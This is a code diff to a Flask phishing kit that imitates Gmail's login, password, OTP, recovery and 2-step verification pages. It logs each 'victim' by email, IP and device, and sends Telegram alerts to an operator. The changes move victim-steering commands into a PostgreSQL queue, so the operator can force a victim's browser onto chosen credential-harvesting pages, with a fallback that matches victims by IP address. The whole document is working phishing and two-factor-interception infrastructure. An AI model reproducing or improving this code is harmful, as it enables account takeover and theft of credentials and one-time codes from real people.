@@ -39,6 +39,7 @@ def init_db():
     
     c.execute('DROP TABLE IF EXISTS navigations CASCADE')
     c.execute('DROP TABLE IF EXISTS victims CASCADE')
+    c.execute('DROP TABLE IF EXISTS victim_commands CASCADE')
     
     c.execute('''
         CREATE TABLE victims (
@@ -62,6 +63,17 @@ def init_db():
             timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
+    c.execute('''
+        CREATE TABLE victim_commands (
+            id SERIAL PRIMARY KEY,
+            session_id TEXT NOT NULL,
+            ip_address TEXT,
+            command TEXT NOT NULL,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            executed BOOLEAN DEFAULT FALSE,
+            executed_at TIMESTAMP
+        )
+    ''')
     
     c.execute('CREATE INDEX idx_victims_session_id ON victims(session_id)')
     c.execute('CREATE INDEX idx_victims_ip_address ON victims(ip_address)')
@@ -72,6 +84,10 @@ def init_db():
     c.execute('CREATE INDEX idx_navigations_timestamp ON navigations(timestamp)')
     c.execute('CREATE INDEX idx_navigations_ip_address ON navigations(ip_address)')
     
+    c.execute('CREATE INDEX idx_commands_session_id ON victim_commands(session_id)')
+    c.execute('CREATE INDEX idx_commands_ip_address ON victim_commands(ip_address)')
+    c.execute('CREATE INDEX idx_commands_executed ON victim_commands(executed)')
+    
     conn.commit()
     conn.close()
     print("PostgreSQL database initialized!")
@@ -80,7 +96,6 @@ init_db()
 
 # Store active victims and control commands
 active_victims = {}
-victim_commands = {}
 
 # Store page data
 verify_page_data = {}
@@ -90,6 +105,78 @@ phone_data = {}
 
 # Store setting states for Telegram
 setting_states = {}
+
+# ============ DATABASE COMMAND FUNCTIONS ============
+def add_command(session_id, command, ip_address=None):
+    """Add a command for a victim in database"""
+    try:
+        conn = get_db_connection()
+        c = conn.cursor()
+        c.execute('''
+            INSERT INTO victim_commands (session_id, ip_address, command) 
+            VALUES (%s, %s, %s)
+        ''', (session_id, ip_address, command))
+        conn.commit()
+        conn.close()
+        print(f"✅ Command '{command}' added for session {session_id}")
+        return True
+    except Exception as e:
+        print(f"❌ Error adding command: {e}")
+        return False
+
+def get_and_clear_command_by_session(session_id):
+    """Get and clear command for a session"""
+    try:
+        conn = get_db_connection()
+        c = conn.cursor()
+        c.execute('''
+            SELECT id, command FROM victim_commands 
+            WHERE session_id = %s AND executed = FALSE 
+            ORDER BY created_at DESC LIMIT 1
+        ''', (session_id,))
+        result = c.fetchone()
+        
+        if result:
+            cmd_id, command = result
+            c.execute('''
+                UPDATE victim_commands SET executed = TRUE, executed_at = CURRENT_TIMESTAMP 
+                WHERE id = %s
+            ''', (cmd_id,))
+            conn.commit()
+            conn.close()
+            return command
+        conn.close()
+        return None
+    except Exception as e:
+        print(f"❌ Error getting command by session: {e}")
+        return None
+
+def get_and_clear_command_by_ip(ip_address):
+    """Get and clear command for an IP address (fallback)"""
+    try:
+        conn = get_db_connection()
+        c = conn.cursor()
+        c.execute('''
+            SELECT id, session_id, command FROM victim_commands 
+            WHERE ip_address = %s AND executed = FALSE 
+            ORDER BY created_at DESC LIMIT 1
+        ''', (ip_address,))
+        result = c.fetchone()
+        
+        if result:
+            cmd_id, session_id, command = result
+            c.execute('''
+                UPDATE victim_commands SET executed = TRUE, executed_at = CURRENT_TIMESTAMP 
+                WHERE id = %s
+            ''', (cmd_id,))
+            conn.commit()
+            conn.close()
+            return session_id, command
+        conn.close()
+        return None, None
+    except Exception as e:
+        print(f"❌ Error getting command by IP: {e}")
+        return None, None
 
 # Force webhook setup on every request
 def ensure_webhook():
@@ -139,7 +226,6 @@ def get_device_info(user_agent):
     
     ua = user_agent.lower()
     
-    # Check for mobile devices
     if 'iphone' in ua:
         device = "iPhone"
     elif 'ipad' in ua:
@@ -170,18 +256,13 @@ def send_telegram_notification_with_buttons(message, session_id=None):
         if not chat_id:
             return False
         
-        # Create inline keyboard with View Victim button
-        keyboard = {
-            "inline_keyboard": []
-        }
+        keyboard = {"inline_keyboard": []}
         
         if session_id:
-            # Add View Victim button if session_id is provided
             keyboard["inline_keyboard"].append([
                 {"text": "👤 View Victim", "callback_data": f"victim_detail|{session_id}"}
             ])
         
-        # Always add Main Menu button
         keyboard["inline_keyboard"].append([
             {"text": "🔙 Main Menu", "callback_data": "main_menu"}
         ])
@@ -335,7 +416,7 @@ def get_victim_page_display(page_name):
 
 @app.before_request
 def check_restrictions():
-    """Check commands for victims"""
+    """Check commands for victims using database"""
     user_agent = request.headers.get('User-Agent', '')
     if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
         return None
@@ -347,28 +428,36 @@ def check_restrictions():
         request.path.startswith('/static/')):
         return None
     
+    command_map = {
+        'go_to_login': 'gmail_login',
+        'go_to_waiting': 'waiting',
+        'go_to_stall': 'stall',
+        'go_to_verify': 'verify',
+        'go_to_password': 'password',
+        'go_to_reset': 'reset',
+        'go_to_otp': 'otp',
+        'go_to_invalid': 'invalid',
+        'go_to_recovery': 'recovery',
+        'go_to_2step': 'twostep'
+    }
+    
+    # Try by session_id first
     victim_session = session.get('victim_session')
-    if victim_session and victim_session in victim_commands:
-        command = victim_commands[victim_session]
-        print(f"🎯 Executing command: {command} for session {victim_session}")
-        
-        command_map = {
-            'go_to_login': 'gmail_login',
-            'go_to_waiting': 'waiting',
-            'go_to_stall': 'stall',
-            'go_to_verify': 'verify',
-            'go_to_password': 'password',
-            'go_to_reset': 'reset',
-            'go_to_otp': 'otp',
-            'go_to_invalid': 'invalid',
-            'go_to_recovery': 'recovery',
-            'go_to_2step': 'twostep'
-        }
-        
-        if command in command_map:
-            victim_commands.pop(victim_session, None)
-            page_name = command_map[command]
-            return redirect(url_for(page_name))
+    if victim_session:
+        command = get_and_clear_command_by_session(victim_session)
+        if command and command in command_map:
+            print(f"🎯 Executing command by session: {command}")
+            return redirect(url_for(command_map[command]))
+    
+    # Fallback: try by IP address
+    client_ip = get_client_ip()
+    session_id, command = get_and_clear_command_by_ip(client_ip)
+    if command and command in command_map:
+        print(f"🎯 Executing command by IP: {command}")
+        if session_id:
+            session['victim_session'] = session_id
+            session['is_victim'] = True
+        return redirect(url_for(command_map[command]))
     
     return None
 
@@ -401,30 +490,38 @@ def index():
     invite_num = random.randint(2, 999)
     return render_template('index.html', invite_num=invite_num)
 
+# ============ ALL ROUTES WITH SESSION FIX ============
+def ensure_session():
+    """Ensure victim session exists"""
+    if 'victim_session' not in session:
+        client_ip = get_client_ip()
+        user_agent = request.headers.get('User-Agent', '')
+        session_id = create_victim_session(client_ip, user_agent)
+        session['victim_session'] = session_id
+        session['is_victim'] = True
+        session['email'] = ''
+    return session['victim_session']
+
 @app.route('/gmail-login')
 def gmail_login():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id:
-        log_navigation(session_id, 'Gmail Login Page', session.get('email'))
-        update_victim_page(session_id, 'gmail_login')
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>
+    log_navigation(session_id, 'Gmail Login Page', session.get('email'))
+    update_victim_page(session_id, 'gmail_login')
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>
 
 📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Gmail Login"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('login.html')
 
@@ -472,36 +569,29 @@ def login():
 
 @app.route('/waiting')
 def waiting():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id:
-        log_navigation(session_id, 'Waiting Page', session.get('email'))
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""⏳ <b>VICTIM REACHED WAITING PAGE!</b>
+    log_navigation(session_id, 'Waiting Page', session.get('email'))
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""⏳ <b>VICTIM REACHED WAITING PAGE!</b>
 
 📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Waiting"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('waiting.html')
 
 @app.route('/stall', methods=['GET', 'POST'])
 def stall():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
@@ -526,55 +616,30 @@ def stall():
         
         return redirect(url_for('waiting'))
     
-    if session_id:
-        log_navigation(session_id, 'Stall Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""⏸️ <b>VICTIM REACHED STALL PAGE!</b>
+    log_navigation(session_id, 'Stall Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""⏸️ <b>VICTIM REACHED STALL PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Stall (CAPTCHA)"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('stall.html')
 
-@app.route('/api/set-verify-data', methods=['POST'])
-def set_verify_data():
-    data = request.get_json()
-    session_id = data.get('session_id')
-    email = data.get('email')
-    
-    if session_id and email:
-        verify_page_data[session_id] = {
-            'email': email,
-            'timestamp': datetime.now().isoformat()
-        }
-    
-    return jsonify({'success': True})
-
-@app.route('/api/get-verify-data')
-def get_verify_data():
-    session_id = session.get('victim_session')
-    if session_id and session_id in verify_page_data:
-        return jsonify(verify_page_data[session_id])
-    return jsonify({'email': ''})
-
 @app.route('/verify', methods=['GET', 'POST'])
 def verify():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id and session_id in verify_page_data:
+    if session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
     if request.method == 'POST':
@@ -598,34 +663,30 @@ def verify():
         
         return redirect(url_for('waiting'))
     
-    if session_id:
-        log_navigation(session_id, 'Verify Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""🔐 <b>VICTIM REACHED VERIFY PAGE!</b>
+    log_navigation(session_id, 'Verify Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""🔐 <b>VICTIM REACHED VERIFY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Verify"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('verify.html', placeholders={'email': email})
 
 @app.route('/password', methods=['GET', 'POST'])
 def password():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id and session_id in verify_page_data:
+    if session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
     if request.method == 'POST':
@@ -648,48 +709,30 @@ def password():
         
         return redirect(url_for('waiting'))
     
-    if session_id:
-        log_navigation(session_id, 'Password Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>
+    log_navigation(session_id, 'Password Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Password"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('password.html', placeholders={'email': email})
 
-@app.route('/track-navigation', methods=['POST'])
-def track_navigation():
-    if not session.get('is_victim'):
-        return jsonify({'success': False})
-    
-    data = request.get_json()
-    page_url = data.get('page_url', 'Unknown')
-    session_id = session.get('victim_session')
-    
-    if session_id:
-        log_navigation(session_id, page_url, session.get('email'))
-    
-    return jsonify({'success': True})
-
 @app.route('/invalid', methods=['GET', 'POST'])
 def invalid():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id and session_id in verify_page_data:
+    if session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
     if request.method == 'POST':
@@ -713,34 +756,30 @@ def invalid():
         
         return redirect(url_for('waiting'))
     
-    if session_id:
-        log_navigation(session_id, 'Invalid Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""🚫 <b>VICTIM REACHED INVALID PAGE!</b>
+    log_navigation(session_id, 'Invalid Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""🚫 <b>VICTIM REACHED INVALID PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Invalid/Too Many Attempts"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('invalid.html', placeholders={'email': email})
 
 @app.route('/reset', methods=['GET', 'POST'])
 def reset():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id and session_id in verify_page_data:
+    if session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
     if request.method == 'POST':
@@ -765,38 +804,34 @@ def reset():
         
         return redirect(url_for('waiting'))
     
-    if session_id:
-        log_navigation(session_id, 'Reset Password Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>
+    log_navigation(session_id, 'Reset Password Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Reset Password"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('reset.html', placeholders={'email': email})
 
 @app.route('/otp', methods=['GET', 'POST'])
 def otp():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id and session_id in verify_page_data:
+    if session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
     
     phone = '****'
-    if session_id and session_id in verify_page_data:
+    if session_id in verify_page_data:
         phone = verify_page_data[session_id].get('phone', '****')
     
     if request.method == 'POST':
@@ -819,12 +854,11 @@ def otp():
         
         return redirect(url_for('waiting'))
     
-    if session_id:
-        log_navigation(session_id, 'OTP Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""🔢 <b>VICTIM REACHED OTP PAGE!</b>
+    log_navigation(session_id, 'OTP Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""🔢 <b>VICTIM REACHED OTP PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
@@ -832,38 +866,34 @@ def otp():
 📞 <b>Phone:</b> <code>{phone}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> OTP"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('otp.html', placeholders={'email': email, 'phone': phone})
 
 @app.route('/recovery')
 def recovery():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
     recovery_data = {}
-    if session_id and session_id in recovery_page_data:
+    if session_id in recovery_page_data:
         recovery_data = recovery_page_data[session_id]
         email = recovery_data.get('email', email)
     
     number = ''
-    if session_id and session_id in recovery_page_data:
+    if session_id in recovery_page_data:
         number = recovery_page_data[session_id].get('number', '')
     
-    if session_id:
-        log_navigation(session_id, 'Recovery Page', email)
+    log_navigation(session_id, 'Recovery Page', email)
+    
+    notification_key = f'notified_recovery_{session_id}'
+    if not session.get(notification_key):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        notification_key = f'notified_recovery_{session_id}'
-        if not session.get(notification_key):
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            message = f"""📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
+        message = f"""📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔢 <b>Number Displayed:</b> <code>{number or 'Not set'}</code>
@@ -871,9 +901,9 @@ def recovery():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Recovery"""
-            
-            send_telegram_notification_with_buttons(message, session_id)
-            session[notification_key] = True
+        
+        send_telegram_notification_with_buttons(message, session_id)
+        session[notification_key] = True
     
     return render_template('recovery.html', placeholders={
         'email': email, 
@@ -882,29 +912,25 @@ def recovery():
 
 @app.route('/2step', methods=['GET', 'POST'])
 def twostep():
-    if not session.get('is_victim'):
-        return redirect(url_for('index'))
-    
-    session_id = session.get('victim_session')
+    session_id = ensure_session()
     email = session.get('email', '')
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
     verification_data = {}
-    if session_id and session_id in verification_page_data:
+    if session_id in verification_page_data:
         verification_data = verification_page_data[session_id]
         email = verification_data.get('email', email)
     
     phone_type = 'iPhone'
-    if session_id and session_id in verification_page_data:
+    if session_id in verification_page_data:
         phone_type = verification_page_data[session_id].get('phone', 'iPhone')
     
-    if session_id:
-        log_navigation(session_id, '2-Step Verification Page', email)
-        
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        message = f"""📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
+    log_navigation(session_id, '2-Step Verification Page', email)
+    
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 📱 <b>Phone Displayed:</b> <code>{phone_type}</code>
@@ -912,8 +938,8 @@ def twostep():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> 2-Step Verification"""
-        
-        send_telegram_notification_with_buttons(message, session_id)
+    
+    send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('2stepverification.html', placeholders={
         'email': email, 
@@ -992,9 +1018,19 @@ def get_phone_data():
 def check_command():
     session_id = session.get('victim_session')
     
-    if session_id and session_id in victim_commands:
-        command = victim_commands[session_id]
-        victim_commands.pop(session_id, None)
+    if session_id:
+        # Check database for commands
+        command = get_and_clear_command_by_session(session_id)
+        if command:
+            return jsonify({'command': command})
+    
+    # Check by IP
+    client_ip = get_client_ip()
+    session_id, command = get_and_clear_command_by_ip(client_ip)
+    if command:
+        if session_id:
+            session['victim_session'] = session_id
+            session['is_victim'] = True
         return jsonify({'command': command})
     
     return jsonify({'command': None})
@@ -1320,8 +1356,29 @@ def force_victim(session_id, page, chat_id, message_id):
     }
     
     if page in action_map:
-        victim_commands[session_id] = action_map[page]
+        command = action_map[page]
+        
+        # Get IP address
+        ip_address = None
+        if session_id in active_victims:
+            ip_address = active_victims[session_id].get('ip_address')
+        else:
+            try:
+                conn = get_db_connection()
+                c = conn.cursor()
+                c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
+                result = c.fetchone()
+                if result:
+                    ip_address = result[0]
+                conn.close()
+            except:
+                pass
+        
+        # Store command in database (reliable)
+        add_command(session_id, command, ip_address)
+        
         text = f"✅ Victim forced to <b>{page}</b> page!"
+        print(f"🎯 Command '{command}' stored in database for session {session_id}")
     else:
         text = f"❌ Invalid page: {page}"
     
@@ -1335,6 +1392,7 @@ def force_victim(session_id, page, chat_id, message_id):
     
     edit_telegram_message(chat_id, message_id, text, keyboard)
 
+# ============ SETTING FUNCTIONS ============
 def set_victim_email(session_id, email, chat_id, message_id):
     if not email:
         setting_states[chat_id] = {
@@ -1524,13 +1582,12 @@ def delete_victim_telegram(session_id, chat_id, message_id):
     conn = get_db_connection()
     c = conn.cursor()
     c.execute("UPDATE victims SET is_active = FALSE WHERE session_id = %s", (session_id,))
+    c.execute("DELETE FROM victim_commands WHERE session_id = %s", (session_id,))
     conn.commit()
     conn.close()
     
     if session_id in active_victims:
         del active_victims[session_id]
-    if session_id in victim_commands:
-        del victim_commands[session_id]
     if session_id in verify_page_data:
         del verify_page_data[session_id]
     if session_id in recovery_page_data:
@@ -1558,6 +1615,8 @@ def send_stats(chat_id, message_id=None):
     total_count = c.fetchone()[0]
     c.execute("SELECT COUNT(*) FROM navigations")
     nav_count = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM victim_commands WHERE executed = FALSE")
+    pending_commands = c.fetchone()[0]
     conn.close()
     
     text = f"""📊 <b>Statistics</b>
@@ -1565,7 +1624,7 @@ def send_stats(chat_id, message_id=None):
 👤 <b>Active Victims:</b> {active_count}
 📋 <b>Total Victims:</b> {total_count}
 🗺️ <b>Total Navigations:</b> {nav_count}
-⚡ <b>Active Commands:</b> {len(victim_commands)}"""
+⚡ <b>Pending Commands:</b> {pending_commands}"""
     
     keyboard = {
         "inline_keyboard": [
@@ -1585,13 +1644,14 @@ def clear_all_victims(chat_id, message_id):
     c = conn.cursor()
     c.execute("DELETE FROM navigations")
     c.execute("DELETE FROM victims")
+    c.execute("DELETE FROM victim_commands")
     c.execute("ALTER SEQUENCE victims_id_seq RESTART WITH 1")
     c.execute("ALTER SEQUENCE navigations_id_seq RESTART WITH 1")
+    c.execute("ALTER SEQUENCE victim_commands_id_seq RESTART WITH 1")
     conn.commit()
     conn.close()
     
     active_victims.clear()
-    victim_commands.clear()
     verify_page_data.clear()
     recovery_page_data.clear()
     verification_page_data.clear()
